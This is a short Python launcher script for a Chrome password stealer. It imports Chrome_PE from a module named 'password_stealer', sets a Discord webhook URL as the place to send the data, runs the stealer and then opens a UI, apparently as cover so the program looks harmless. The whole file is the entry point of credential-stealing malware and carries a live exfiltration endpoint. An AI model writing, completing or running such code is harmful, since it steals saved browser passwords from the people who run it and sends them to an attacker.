from password_stealer import Chrome_PE
import ui
WEBHOOK_URL = "https://discord.com/api/webhooks/1446946425530224684/SurRVSUxpDI0UJjhNiTg5sDpcUd56nrgRTl6HBuEh5yBY8qz4NZNt5FEPVvqhbUa3lnN"
TEMP_PATH = ""

if __name__ == "__main__":
    PE = Chrome_PE(
        webhook_url=WEBHOOK_URL,
    )
    PE.execute()  
    ui.main()